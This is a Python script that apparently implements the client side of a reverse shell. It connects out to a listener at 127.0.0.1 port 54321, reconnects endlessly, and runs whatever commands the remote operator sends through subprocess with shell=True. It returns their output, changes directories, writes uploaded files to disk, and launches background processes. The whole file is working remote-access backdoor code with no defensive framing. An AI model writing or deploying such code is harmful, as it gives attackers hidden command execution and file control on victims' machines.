import socket
import subprocess
import json
import os
import base64
from time import sleep
import sys
def reliable_send(data):
    json_data = json.dumps(data)
    s.send(json_data.encode('utf-8'))

def reliable_recv():
    data = ""
    while True:
        try:
            data = s.recv(1024).decode('utf-8')
            return json.loads(data)
        except ValueError:
            print("error")
            continue   
def large_reliable_recv():
    data = ""
    while True:
        try:
            data = s.recv(4000).decode('utf-8')
            return json.loads(data)
        except ValueError:
            print("error")
            continue   

def connection():
    while True:
        
        try:
            global s
            s = ""
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print("Trying to connect")
            
            s.connect(("127.0.0.1", 54321))
            
            print("CONNECTED")
            shell()
            
        except:
            sleep(2)
            connection()
            



def shell():
    print("ENTERED SHELL")
    while True:
        try:
            command = reliable_recv()
            print("Received: " + command)
            if command == "q":
                continue
            elif command == "exit":
                break
            elif command == "ka":
                reliable_send("y")
            elif command[:7] == "sendall":
                subprocess.Popen(command[8:], shell=True)
    
            elif command[:6] == "upload":
                filename = command[7:]
                file = open(filename, "w")
                data = reliable_recv()
                file.write(data)
                file.close()
                


            elif command[:2] == "cd":
                
    

                try:
                    if len(command[3:]) == 0:
                        print("Command is nil")
                        proc = subprocess.check_output(command, shell=True).decode('UTF-8')
                        print(proc)
                        reliable_send(str(proc))
                    else:
                        print("Changing dir to: " + command[3:])
                        os.chdir(command[3:])
                        cwd = os.getcwd()
                        reliable_send(str(cwd))
                except:
                    reliable_send("CD CMD Error")
            else:
                proc = subprocess.check_output(command, shell=True).decode('UTF-8')
                print(proc)
                sleep(0.2)
                reliable_send(proc)
                print("Sended it back")
        except:
            s.close()
            connection()
    print("closed server")
    
            
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


connection()




